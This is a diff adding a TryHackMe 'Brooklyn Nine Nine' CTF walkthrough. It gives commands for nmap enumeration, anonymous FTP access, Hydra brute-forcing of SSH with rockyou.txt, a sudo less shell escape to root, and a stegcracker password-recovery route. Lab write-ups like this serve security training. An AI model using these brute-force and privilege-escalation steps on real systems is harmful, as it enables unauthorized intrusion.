@@ -1,0 +1,149 @@
+## 🕵‍♂ TryHackMe: Brooklyn Nine Nine – Walkthrough
+
+### 🎯 Objective:
+
+Gain initial access to the machine, escalate privileges, and capture both user and root flags using multiple techniques including brute force, FTP enumeration, and steganography.
+
+---
+
+## 1. 🔍 Network Enumeration
+
+Use nmap to scan for open ports and running services:
+
+nmap -sC -sV -p- -oN fullscan.txt <TARGET_IP>
+
+
+### Findings:
+
+* *Port 21 (FTP)* — Allows anonymous login
+* *Port 22 (SSH)* — OpenSSH, potential entry point with valid credentials
+* *Port 80 (HTTP)* — Apache2, hosting a static image page
+
+---
+
+## 2. 📁 FTP Access (Port 21)
+
+Attempt anonymous FTP login:
+
+ftp <TARGET_IP>
+
+
+You’ll find a file:
+
+
+note_to_jake.txt
+
+
+*Contents:*
+
+
+Jake,
+Please remember to change your password. It’s way too weak and can be brute-forced easily.
+
+- Captain Holt
+
+
+➡ This hints that Jake’s SSH password can likely be cracked via brute force.
+
+---
+
+## 3. 🔐 SSH Brute Forcing
+
+Use Hydra to brute-force Jake’s password:
+
+hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>
+
+
+After a few seconds/minutes, you’ll obtain valid credentials:
+
+
+jake:<password>
+
+
+---
+
+## 4. 🧑‍💻 User Shell Access
+
+Login using SSH:
+
+ssh jake@<TARGET_IP>
+
+
+Check for flags:
+
+find /home -name user.txt 2>/dev/null
+cat /home/holt/user.txt
+
+
+✅ *User Flag obtained.*
+
+---
+
+## 5. ⬆ Privilege Escalation (Jake → Root)
+
+Check Jake’s sudo permissions:
+
+sudo -l
+
+
+Result:
+
+
+(ALL) NOPASSWD: /usr/bin/less
+
+
+Since less is a text reader, but allows shell escape, you can exploit this:
+
+sudo less /etc/profile
+
+
+Once in the less viewer, type:
+
+
+!sh
+
+
+💥 This spawns a root shell!
+
+Get the root flag:
+
+cat /root/root.txt
+
+
+✅ *Root Flag obtained.*
+
+---
+
+## 🧠 Alternative Path: Steganography Route
+
+Inspect the HTTP server. Download the image shown on the webpage:
+
+wget http://<TARGET_IP>/brooklyn99.jpg
+
+
+Use steganography to find hidden data:
+
+stegcracker brooklyn99.jpg /usr/share/wordlists/rockyou.txt
+
+
+Output:
+
+
+Found passphrase: holt:<password>
+
+
+Login via SSH:
+
+ssh holt@<TARGET_IP>
+
+
+Check sudo access:
+
+sudo -l
+
+
+If holt also has permissions for less, use the same exploit to get root.
+
+---
+
+
